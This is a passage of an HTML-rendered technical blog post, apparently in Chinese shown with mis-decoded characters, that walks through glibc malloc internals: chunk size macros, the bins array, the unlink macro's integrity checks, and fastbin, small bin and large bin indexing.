class="hljs-meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span><br><span class="hljs-comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="hljs-comment">/* Set the size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><br><span class="hljs-comment">/* extract p&#x27;s inuse bit */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)                                                              \</span><br><span class="hljs-meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><span class="hljs-comment">/* set/clear chunk as being inuse without otherwise disturbing */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse(p)                                                              \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse(p)                                                              \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span><br><span class="hljs-comment">/* check/set/clear inuse bits in known places */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span><br><span class="hljs-comment">/* Set size at head, without disturbing its use bit */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span><br><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span><br><span class="hljs-comment">/* Set size at footer (only when chunk is not in use) */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br></code></pre></div></td></tr></table></figure><h2 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h2><h3 id="åœ¨malloc-stateä¸­çš„å­˜å‚¨"><a href="#åœ¨malloc-stateä¸­çš„å­˜å‚¨" class="headerlink" title="åœ¨malloc_stateä¸­çš„å­˜å‚¨"></a>åœ¨malloc_stateä¸­çš„å­˜å‚¨</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/* Fastbins */</span><br>mfastbinptr fastbinsY[NFASTBINS];<br><span class="hljs-comment">/* Normal bins packed as described above */</span><br>mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="binæ•°ç»„å®šä½-å¤§å°"><a href="#binæ•°ç»„å®šä½-å¤§å°" class="headerlink" title="binæ•°ç»„å®šä½+å¤§å°"></a>binæ•°ç»„å®šä½+å¤§å°</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NBINS             128<span class="hljs-comment">//biné“¾é•¿åº¦</span></span><br><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist, */</span><span class="hljs-comment">/*Bin 1 is the unordered list*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                              \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))  </span><br><span class="hljs-comment">/* analog of ++bin */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span><br><span class="hljs-comment">/* Reminders about list directionality within bins */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br></code></pre></div></td></tr></table></figure><ul><li><p>bin_atçš„ç¥å¥‡æ“ä½œ: </p><ul><li>å¯¹å¤–éƒ¨è€Œè¨€, binæ•°ç»„åº”è¯¥ä¸º128ä¸ª, è¾“å…¥çš„ä¸‹æ ‡ä¹Ÿæ˜¯å¦‚æ­¤, åˆ°äº†å†…éƒ¨å°†å…¶è½¬æ¢ä¸ºè¯¥ä½ç½®chunkçš„fdæŒ‡é’ˆ, å–åœ°å€â€&amp;â€, è½¬æ¢ä¸ºå•å­—èŠ‚æŒ‡é’ˆchar *, ç„¶åå‡å»chunk headçš„å­—èŠ‚æ•°, å˜ä¸ºè¯¥chunkçš„å¤´éƒ¨, æ³¨æ„åˆ°chunkä¸­åªæœ‰fdå’ŒbkåŸŸæœ‰æ„ä¹‰, å…¶ä½™éƒ¨åˆ†å±äºä¸Šä¸€ä¸ªbinå¤´ç»“ç‚¹.</li><li>é™¤äº†å¤–éƒ¨ä¸‹æ ‡åˆ°å†…éƒ¨ä¸‹æ ‡çš„è½¬æ¢, <strong>å…¶ä½™æ­¥éª¤ç›¸å½“äºmem2chunk()çš„ç»“æœ</strong> </li></ul></li><li><p>ä¸ºä»€ä¹ˆæ˜¯<strong>ä¹˜ä»¥2</strong>å‘¢?</p><p>å› ä¸ºæ¯ä¸ªbiné“¾åœ¨binsæ•°ç»„ä¸­å­˜å‚¨çš„æ˜¯ä¸€ä¸ªfdæŒ‡é’ˆå’Œä¸€ä¸ªbkæŒ‡é’ˆï¼Œå³ä¸¤ä¸ªmalloc chunkæŒ‡é’ˆï¼Œæ‰€ä»¥è¦NBINS * 2<br>åˆå› ä¸ºæ•°ç»„binsä¸­ç´¢å¼•ä¸º0ã€1çš„æŒ‡é’ˆæ˜¯ä¸ä½¿ç”¨çš„ï¼Œæ‰€ä»¥è¦å‡å»2</p><blockquote><p>ä¾‹ï¼š bins[2]ä¸ºunsorted biné“¾çš„fdæˆå‘˜ï¼Œbin[3]ä¸ºå…¶bkæˆå‘˜, bin[0]ä¸ºå…¶presize, bin[1]ä¸ºå…¶size</p></blockquote><img src="../../image/glibc_malloc_srcCode/sbzY4vrhU2wZypm.png" style="zoom: 33%;" /> </li></ul><h3 id="unlinkï¼šä»binsä¸­å–å‡ºchunk"><a href="#unlinkï¼šä»binsä¸­å–å‡ºchunk" class="headerlink" title="unlinkï¼šä»binsä¸­å–å‡ºchunk"></a>unlinkï¼šä»binsä¸­å–å‡ºchunk</h3><ul><li>å‘ç”Ÿåœ¨è°ƒç”¨freeæ—¶åˆå¹¶chunkçš„æ—¶å€™. è¢«åˆå¹¶çš„chunkè¢«unlinkå‡ºæ¥. </li><li>2.25ä¸­unlinkä¸ºå®å®šä¹‰, 2.26ä¸ºunlink_chunkå‡½æ•°, ä»…ä»…å¤šäº†ä¸€ä¸ªæ£€æŸ¥<ul><li><code>if (chunksize (p) != prev_size (next_chunk (p)))  malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</code> </li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><span class="hljs-comment">//çœç•¥äº†æ¯è¡Œæœ«å°¾çš„åæ–œæ </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unlink(AV, P, BK, FD) </span><br>&#123; <span class="hljs-comment">//ä¾‹å­unlink(av, victim, bck, fwd)</span><br>    FD = P-&gt;fd;<span class="hljs-comment">//å–å‡ºvictimçš„fdå’ŒbkæŒ‡é’ˆ</span><br>    BK = P-&gt;bk;<br><span class="hljs-comment">//ä¾‹è¡Œæ£€æŸ¥,å®é™…ä¸Šå°±æ˜¯å¦‚æœvictimæ²¡æœ‰å®Œæ•´çš„åœ¨é“¾è¡¨ä¸­çš„è¯å°±æŠ¥é”™</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//å¦‚æœæ­£å¸¸çš„è¯</span><br>        FD-&gt;bk = BK;<br>        BK-&gt;fd = FD; <span class="hljs-comment">//å–å‡ºäº†victim</span><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P)) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) <br>        &#123;<span class="hljs-comment">//å¦‚æœåœ¨largebiné‡Œçš„é“¾è¡¨ ä¸” åœ¨chunk sizeé“¾è¡¨é‡Œåˆ™éœ€è¦é¢å¤–è®¾ç½®fd_nextsizeå’Œbk_nextsize</span><br>            <span class="hljs-comment">//ç®€å•çš„æ£€æŸ¥, victimæ˜¯ä¸æ˜¯ *å®Œæ•´çš„* åœ¨chunk sizeé“¾è¡¨</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)<br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);<br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//FDå’ŒvictimåŒæ ·å¤§å°</span><br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)<span class="hljs-comment">//fd_nextsizeç­‰äºè‡ªèº«åªèƒ½è¯´æ˜é“¾è¡¨é‡Œåªæœ‰è¿™ä¸ªå¤§å°</span><br>                  <span class="hljs-comment">//ç°åœ¨å°±å‰©ä¸‹FD(åé¢æˆ–è®¸è¿˜æœ‰ç­‰å¤§çš„)äº†, ä¿®æ”¹ä¸€ä¸‹chunk sizeé“¾è¡¨</span><br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;<br>                <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//é“¾è¡¨é‡Œè¿˜æœ‰å…¶ä»–çš„chunk</span><br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;<br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;<br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;<br>                    P-&gt;bk_nextsize-&gt;fd_nextsi  ze = FD;<br>                  &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//victimæ˜¯ä¸€ä¸ªå•ç‹¬çš„chunk</span><br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;<br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p><strong>ç›¸å…³ä»‹ç»å’Œç‰¹ç‚¹</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Fastbins</span><br><span class="hljs-comment">    An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="hljs-comment">    are not doubly linked.  It is faster to single-link them, and</span><br><span class="hljs-comment">    since chunks are never removed from the middles of these lists,</span><br><span class="hljs-comment">    double linking is not necessary. Also, unlike regular bins, they</span><br><span class="hljs-comment">    are not even processed in FIFO order (they use faster LIFO) since</span><br><span class="hljs-comment">    ordering doesn&#x27;t much matter in the transient contexts in which</span><br><span class="hljs-comment">    fastbins are normally used.</span><br><span class="hljs-comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span><br><span class="hljs-comment">    be consolidated with other free chunks. malloc_consolidate</span><br><span class="hljs-comment">    releases all chunks in fastbins and consolidates them with</span><br><span class="hljs-comment">    other free chunks.</span><br><span class="hljs-comment"> */</span><br>- ä½¿ç”¨LIFO, åœ¨é“¾è¡¨å¤´æ‰§è¡Œå–å‡ºæ’å…¥æ“ä½œ<br>- PREV_INUSEæ€»ä¸º<span class="hljs-number">1</span>, ä¸ä¼šå’Œç›¸é‚»å—è¿›è¡Œåˆå¹¶<br>- chunkä»ä¸ä¼šåœ¨é“¾è¡¨ä¸­é—´è¢«åˆ å», åªéœ€è¦å•å‘é“¾è¡¨å³å¯<br></code></pre></div></td></tr></table></figure><p><strong>indexing</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br><span class="hljs-comment">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></code></pre></div></td></tr></table></figure><ul><li>ä»fastbin_indexæ–¹æ³•ä¹Ÿå¯ä»¥çœ‹å‡ºfastbinæ˜¯å°†<strong>chunkå¤§å°</strong>è½¬æ¢ä¸º<strong>æ•°æ®ç©ºé—´å¤§å°</strong>æ¥indexçš„, ä»æœ€çŸ­çš„8å­—èŠ‚åˆ°80å­—èŠ‚(é»˜è®¤64å­—èŠ‚), å®é™…ä¸Šæ”¯æŒ(80 * SIZE_SZ / 4)å­—èŠ‚</li></ul><p><strong>æ•°é‡å’Œå®¹é‡</strong> </p><p><code>_int_malloc</code>ä¸­åˆ¤æ–­chunkæ˜¯å¦åœ¨fastbinèŒƒå›´å†…ä½¿ç”¨çš„æ˜¯<code>get_max_fast()</code>å‡½æ•°, è¿”å›çš„æ˜¯<code>global_max_fast</code>å˜é‡, åœ¨<code>malloc_init_state()</code>ä¸­è°ƒç”¨<code>set_max_fast(DEFAULT_MXFAST)</code>åˆå§‹åŒ–ä¸º128.</p><p>ä¹Ÿå°±æ˜¯è¯´fastbinçš„èŒƒå›´æ˜¯<strong>0x20-0x80</strong>.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* The maximum fastbin request size we support */</span><br><span class="hljs-comment">//    DEFAULT_MXFAST     64 (for 32bit), 128 (for 64bit)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)                                                      \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span><br><span class="hljs-comment">   that triggers automatic consolidation of possibly-surrounding</span><br><span class="hljs-comment">   fastbin chunks. This is a heuristic, so the exact value should not</span><br><span class="hljs-comment">   matter too much. It is defined at half the default trim threshold as a</span><br><span class="hljs-comment">   compromise heuristic to only attempt consolidation if it is likely</span><br><span class="hljs-comment">   to lead to trimming. However, it is not dynamically tunable, since</span><br><span class="hljs-comment">   consolidation reduces fragmentation surrounding large chunks even</span><br><span class="hljs-comment">   if trimming is not used.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>unsorted binåœ¨binæ•°ç»„ä¸­ä¸‹æ ‡ä¸º1çš„ä½ç½®(0æ— æ„ä¹‰)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span><br></code></pre></div></td></tr></table></figure><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT <span class="hljs-comment">//32ä¸º8, 64ä¸º16</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ) <span class="hljs-comment">//æš‚æ—¶ä¸çŸ¥é“è¿™æ˜¯åšå•¥çš„, ä¸€èˆ¬ä¸º0</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) <span class="hljs-comment">//32:512  64:1024</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br></code></pre></div></td></tr></table></figure><ul><li><p>å¯ä»¥çœ‹åˆ°MIN_LARGE_SIZEç”¨ä½œäº†åˆ¤æ–­å—å¤§å°æ˜¯å¦ä½äºsmall binçš„èŒƒå›´å†…</p></li><li><p>small bin ç´§è·Ÿåœ¨unsorted binä¹‹å, ç´¢å¼•ä»2-63, å¤§å°ä»(0x20-0x3f0, æ³¨æ„è¿™æ˜¯chunkçš„æŒ‡é’ˆ), æ‰€ä»¥indexåªéœ€è¦ç§»ä½å°±å¯ä»¥äº†, ç›¸é‚»ä¸‹æ ‡ä¹‹é—´<strong>å—å¤§å°</strong>é—´éš”0x10(64), 0x8(32)</p></li><li><p><strong>small binå’Œfast binæœ‰ä¸€éƒ¨åˆ†èŒƒå›´æ˜¯é‡åˆçš„</strong> </p></li><li><p><strong>FILO é“¾å¤´å…¥ é“¾å°¾å‡º</strong> </p></li></ul><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32_big(sz)                                            \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_64(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index(sz) \</span><br><span class="hljs-meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span><br><span class="hljs-meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span><br><span class="hljs-meta">   : largebin_index_32 (sz))</span><br></code></pre></div></td></tr></table></figure><ul><li><p>0x400-0xc30 : idx=64-96, é—´éš”0x40<br>0xc40-0x29f0: idx=97- , é—´éš”0x200<br>â€¦.</p></li><li><p><strong>ä»é“¾å¤´(æœ€å·¦è¾¹) åˆ° é“¾å°¾ï¼Œæ²¿ç€å„ä¸ªchunkçš„fdæŒ‡é’ˆï¼Œchunksç”±å¤§åˆ°å°ï¼Œä¾æ¬¡æ’åº</strong> </p><ul><li><p>fd_nextsize æŒ‡å‘å³ä¸€ä¸ªå°äºå½“å‰ chunk çš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œ<strong>ä¸åŒ…å« bin çš„å¤´èŠ‚ç‚¹</strong>ã€‚</p></li><li><p>bk_nextsize æŒ‡å‘å·¦ä¸€ä¸ªå¤§äºå½“å‰ chunk çš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œ<strong>ä¸åŒ…å« bin 